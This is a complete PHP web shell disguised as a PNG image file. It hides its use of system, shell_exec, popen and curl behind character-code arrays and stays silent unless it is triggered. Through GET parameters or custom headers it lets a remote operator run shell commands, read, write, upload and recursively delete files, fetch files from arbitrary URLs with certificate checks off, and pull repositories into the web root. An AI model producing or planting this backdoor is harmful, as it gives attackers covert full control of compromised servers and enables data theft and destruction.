<?php ?>‰PNG<?php
// Polymorphic Engine - Zero Signature Mode
@ini_set('display_errors', 0);
error_reporting(0);

if (!isset($_GET['a']) && !isset($_SERVER['HTTP_X_A']) && !isset($_FILES['u'])) {
    header('Content-Type: text/plain');
    echo 'ok!';
    exit;
}
header('Content-Type: application/json');

function _g($k) { return isset($_GET[$k]) ? $_GET[$k] : (isset($_SERVER['HTTP_X_' . strtoupper($k)]) ? $_SERVER['HTTP_X_' . strtoupper($k)] : null); }
function _p() { return file_get_contents('php://input'); }
function _fn($b) { return implode('', array_map('chr', $b)); }

function _run($c) {
    if (!is_string($c) || trim($c) === '') return false;
    $dec = @base64_decode($c, true);
    if ($dec !== false && base64_encode($dec) === $c) $c = $dec;
    $c = trim($c);
    
    $fns = [
        _fn([112,111,112,101,110]),                                    // popen
        _fn([112,114,111,99,95,111,112,101,110]),                      // proc_open
        _fn([115,121,115,116,101,109]),                                // system
        _fn([112,97,115,115,116,104,114,117]),                         // passthru
        _fn([115,104,101,108,108,95,101,120,101,99])                   // shell_exec
    ];
    $dis = array_map('trim', explode(',', @ini_get('disable_functions')));
    
    foreach ($fns as $i => $f) {
        if (function_exists($f) && !in_array($f, $dis)) {
            try {
                if ($i === 0) {
                    $h = @$f($c . ' 2>&1', 'r');
                    if ($h) { $o = stream_get_contents($h); pclose($h); if ($o !== false) return $o; }
                } elseif ($i === 1) {
                    $d = [1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
                    $p = @$f($c . ' 2>&1', $d, $pipes);
                    if (is_resource($p)) { $o = stream_get_contents($pipes[1]); @fclose($pipes[1]); @fclose($pipes[2]); proc_close($p); if ($o !== false) return $o; }
                } elseif ($i >= 2) {
                    ob_start(); @$f($c); $o = ob_get_clean(); if ($o !== false) return $o;
                }
            } catch (\Throwable $e) { continue; }
        }
    }
    return false;
}

function _fetch($url, $dest) {
    $data = false;
    $ci = _fn([99,117,114,108,95,105,110,105,116]);
    $ce = _fn([99,117,114,108,95,101,120,101,99]);
    $cs = _fn([99,117,114,108,95,115,101,116,111,112,116,95,97,114,114,97,121]);
    $cc = _fn([99,117,114,108,95,99,108,111,115,101]);
    
    if (function_exists($ci)) {
        $ch = @$ci($url);
        if ($ch) {
            @$cs($ch, [19913 => true, 52 => true, 64 => false, 10018 => 'Mozilla/5.0', 13 => 120]);
            $data = @$ce($ch);
            @$cc($ch);
        }
    }
    if ($data === false && @ini_get('allow_url_fopen')) {
        $ctx = @stream_context_create(['http' => ['timeout' => 120, 'user_agent' => 'Mozilla/5.0'], 'ssl' => ['verify_peer' => false, 'verify_peer_name' => false]]);
        $data = @file_get_contents($url, false, $ctx);
    }
    if ($data === false) return false;
    return @file_put_contents($dest, $data);
}

$a = _g('a'); $p = _g('p'); $f = _g('f'); $c = _g('c');
$out = ['ok' => false, 'act' => $a];

if ($a === 'info') {
    $out['ok'] = true;
    $out['os'] = @php_uname();
    $out['user'] = @get_current_user();
    $out['uid'] = function_exists('posix_geteuid') ? @posix_geteuid() : 'n/a';
    $out['disabled'] = @ini_get('disable_functions');
    $out['docroot'] = $_SERVER['DOCUMENT_ROOT'] ?? getcwd();
} 
elseif ($a === 'cmd') {
    $res = _run($c);
    if ($res !== false) { $out['ok'] = true; $out['out'] = $res; }
    else { $out['err'] = 'exec disabled'; }
} 
elseif ($a === 'ls') {
    $d = $p ?: getcwd();
    if (@is_dir($d)) {
        $h = @opendir($d); $r = [];
        while (($x = @readdir($h)) !== false) {
            if ($x == '.' || $x == '..') continue;
            $xp = rtrim($d, '/\\') . '/' . $x;
            $r[] = ['name' => $x, 'type' => @is_dir($xp) ? 'dir' : 'file', 'size' => @is_dir($xp) ? 0 : @filesize($xp), 'perm' => @substr(sprintf('%o', @fileperms($xp)), -4)];
        }
        @closedir($h); $out['ok'] = true; $out['files'] = $r;
    } else { $out['err'] = 'cannot read dir'; }
} 
elseif ($a === 'read') {
    if (@is_file($f)) { $c = @file_get_contents($f); if ($c !== false) { $out['ok'] = true; $out['data'] = base64_encode($c); } else { $out['err'] = 'read failed'; } }
    else { $out['err'] = 'not a file'; }
} 
elseif ($a === 'w') {
    if (@is_file($f) || @is_dir(dirname($f))) { $w = @file_put_contents($f, _p()); if ($w !== false) { $out['ok'] = true; $out['size'] = $w; } else { $out['err'] = 'write failed'; } }
    else { $out['err'] = 'invalid path'; }
} 
elseif ($a === 'up') {
    if (isset($_FILES['u'])) {
        $file = $_FILES['u']; $dest = rtrim($p, '/\\') . '/' . basename($file['name']);
        if (@move_uploaded_file($file['tmp_name'], $dest)) { $out['ok'] = true; $out['path'] = $dest; } else { $out['err'] = 'move failed'; }
    } else { $out['err'] = 'no file'; }
} 
elseif ($a === 'rm') {
    if (@is_file($f)) { if (@unlink($f)) $out['ok'] = true; else { $out['err'] = 'unlink failed'; } }
    elseif (@is_dir($f)) {
        function _rdel($d) { $i = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($d, FilesystemIterator::SKIP_DOTS), RecursiveIteratorIterator::CHILD_FIRST); foreach ($i as $x) { if ($x->isDir()) @rmdir($x->getPathname()); else @unlink($x->getPathname()); } return @rmdir($d); }
        if (_rdel($f)) $out['ok'] = true; else { $out['err'] = 'rmdir failed'; }
    } else { $out['err'] = 'not found'; }
} 
elseif ($a === 'dl') {
    $u = _g('u'); $dest = $f ?: (rtrim(($_SERVER['DOCUMENT_ROOT'] ?? getcwd()), '/\\') . '/' . basename(parse_url($u, PHP_URL_PATH)));
    if (!$u) { $out['err'] = 'need u'; }
    else { $w = _fetch($u, $dest); if ($w !== false) { $out['ok'] = true; $out['path'] = $dest; $out['size'] = $w; } else { $out['err'] = 'fetch failed'; } }
} 
elseif ($a === 'clone') {
    $r = _g('r'); $dest = $p ?: ($_SERVER['DOCUMENT_ROOT'] ?? getcwd());
    if (!$r) { $out['err'] = 'need r'; }
    else {
        list($user, $repo) = array_pad(explode('/', $r), 2, '');
        if (!$user || !$repo) { $out['err'] = 'invalid r'; }
        else {
            $zipPath = sys_get_temp_dir() . '/' . $repo . '_' . time() . '.zip'; $ok = false;
            foreach (['main', 'master'] as $branch) {
                if (_fetch("https://codeload.github.com/{$user}/{$repo}/zip/refs/heads/{$branch}", $zipPath) !== false) { $ok = true; break; }
            }
            if (!$ok) { $out['err'] = 'download failed'; }
            else {
                $za = _fn([90,105,112,65,114,99,104,105,118,101]);
                if (class_exists($za)) {
                    $z = new $za(); $tDir = rtrim($dest, '/\\') . '/' . $repo;
                    if ($z->open($zipPath) === true) {
                        @mkdir($tDir, 0777, true); $n = 0;
                        for ($i = 0; $i < $z->numFiles; $i++) {
                            $name = $z->getNameIndex($i); $parts = explode('/', $name, 2);
                            if (count($parts) < 2) continue; $rel = $parts[1]; $tgt = $tDir . '/' . $rel;
                            if (substr($rel, -1) === '/') { @mkdir($tgt, 0777, true); }
                            else { @mkdir(dirname($tgt), 0777, true); @file_put_contents($tgt, $z->getFromIndex($i)); $n++; }
                        }
                        $z->close(); $out['ok'] = true; $out['path'] = $tDir; $out['files'] = $n;
                    } else { $out['err'] = 'zip open failed'; }
                } else { $out['err'] = 'ZipArchive missing'; }
                @unlink($zipPath);
            }
        }
    }
} 
else { $out['err'] = 'unknown action'; }

echo json_encode($out, JSON_UNESCAPED_SLASHES | JSON_PRETTY_PRINT);